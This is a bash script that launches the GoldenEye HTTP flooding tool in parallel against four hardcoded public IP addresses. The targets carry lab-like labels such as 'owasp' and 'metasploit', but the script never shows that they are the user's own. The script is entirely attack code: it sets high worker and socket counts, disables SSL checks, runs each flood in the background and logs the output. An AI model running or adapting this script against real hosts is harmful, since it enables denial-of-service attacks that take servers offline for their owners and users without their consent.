#!/bin/bash
# Multi-target GoldenEye tester (Fixed & Optimized)

# === Target Servers (Edit if needed) ===
OWASP_SERVER="https://41.203.208.129"
METASPLOIT_SERVER="https://197.248.128.1"
SAMPLE_SERVER="https://197.248.128.2"
SIMPLE_SAMPLE="https://41.203.208.130"

# === GoldenEye Parameters (Lowered for 4GB RAM system) ===
WORKERS=200
SOCKETS=500
METHOD="random"
DEBUG="-d"       # Use "" to disable debug mode
NOSSL="-n"       # Skip SSL verification

# === Log Directory ===
LOGDIR="./logs"
mkdir -p "$LOGDIR"

# === Attack Function ===
attack_server() {
    local TARGET_NAME="$1"
    local TARGET_URL="$2"
    local LOG_FILE="$LOGDIR/${TARGET_NAME}.log"

    echo "[*] Launching attack on: $TARGET_NAME ($TARGET_URL)"
    python3 goldeneye.py "$TARGET_URL" -w "$WORKERS" -s "$SOCKETS" -m "$METHOD" $DEBUG $NOSSL > "$LOG_FILE" 2>&1 &
    echo "$!"  # Return PID
}

# === Start Attacks ===
PID1=$(attack_server "owasp" "$OWASP_SERVER")
sleep 3

PID2=$(attack_server "metasploit" "$METASPLOIT_SERVER")
sleep 3

PID3=$(attack_server "sample" "$SAMPLE_SERVER")
sleep 3

PID4=$(attack_server "simple" "$SIMPLE_SAMPLE")

# === Summary ===
echo
echo "[*] All tests launched in background."
echo "[*] Monitor logs: tail -f $LOGDIR/*.log"
echo "[*] Stop all: kill $PID1 $PID2 $PID3 $PID4"
